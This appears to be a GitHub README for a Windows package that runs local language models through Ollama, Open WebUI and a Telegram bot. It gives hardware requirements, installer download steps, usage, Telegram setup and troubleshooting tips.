# 🤖 local-ai-assistant - Private artificial intelligence on your computer

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Splitpeamidline260/local-ai-assistant/releases)

## 💡 About this project

Local-ai-assistant provides a private space for you to chat with large language models. This software runs entirely on your hardware. It does not send your data to external servers. You keep full control over your privacy and your information. 

The system combines Ollama for model management, Open WebUI for a familiar chat interface, and a Telegram bot for remote access. It works on Windows machines equipped with modern graphics cards.

## ⚙️ System Requirements

Your computer needs specific hardware components to run these models smoothly.

*   **Operating System**: Windows 10 or Windows 11.
*   **Processor**: A modern multi-core CPU.
*   **Memory**: At least 16GB of RAM. 32GB is better for larger models.
*   **Graphics Card**: An NVIDIA GPU with at least 8GB of video memory (VRAM). Faster cards reduce the wait time when the AI generates text.
*   **Storage**: At least 20GB of free space on your solid-state drive (SSD).

## 🚀 Getting Started

Follow these steps to set up the software on your machine.

1.  **Download the installer**: Go to the [official releases page](https://github.com/Splitpeamidline260/local-ai-assistant/releases) to get the latest version.
2.  **Run the file**: Locate the downloaded file in your downloads folder. Double-click it to start the installation wizard.
3.  **Follow the prompts**: The installer sets up the necessary services in the background. Accept the default settings unless you have a specific reason to change them.
4.  **Launch the assistant**: Once finished, find the icon on your desktop or in your start menu. Open it to start the engine.

## 🌐 Using the Web Interface

After launching, the local server starts in the background. Open your web browser and go to the address shown in the application tray icon. This interface looks similar to popular AI chat tools.

*   **Selecting a Model**: Click the dropdown menu at the top of the screen to choose from available models. 
*   **Starting a Chat**: Type your question in the text box at the bottom. Press the Enter key to see the response.
*   **Managing History**: Use the sidebar to name or delete your past conversations.

## 📱 Telegram Integration

You can access your local assistant from your phone using Telegram. This requires a small setup inside the web interface.

1.  **Create a Bot**: Open Telegram and search for the "BotFather". Type `/newbot` and follow the instructions to get an API token.
2.  **Connect to Assistant**: Copy that token into the settings panel within the local AI web interface. 
3.  **Talk to AI**: Once connected, open your new bot in Telegram. Send a message to start chatting. Your local computer processes all requests. 

## 🛡️ Privacy and Safety

This software keeps your data local. No third party sees your prompts. Because the data stays on your machine, you carry the responsibility for the input and output content. Ensure you have enough disk space as models occupy significant memory.

## 🔧 Troubleshooting

If you encounter issues, check these common items:

*   **GPU Drivers**: Keep your NVIDIA drivers updated. If the software does not detect your graphics card, update your drivers via the NVIDIA website.
*   **Background Processes**: If the interface fails to load, ensure that no other service uses the same network port. Restart your computer if a port conflict persists.
*   **Performance**: If responses feel slow, you may need a model with a smaller parameter count. Smaller models use less VRAM and run faster on mid-range hardware. 

## 📝 License

This project uses open-source components. You can view the full license terms in the source repository documentation. Modifying the code is possible, but the provided installer allows for a functional setup without touching the underlying source files.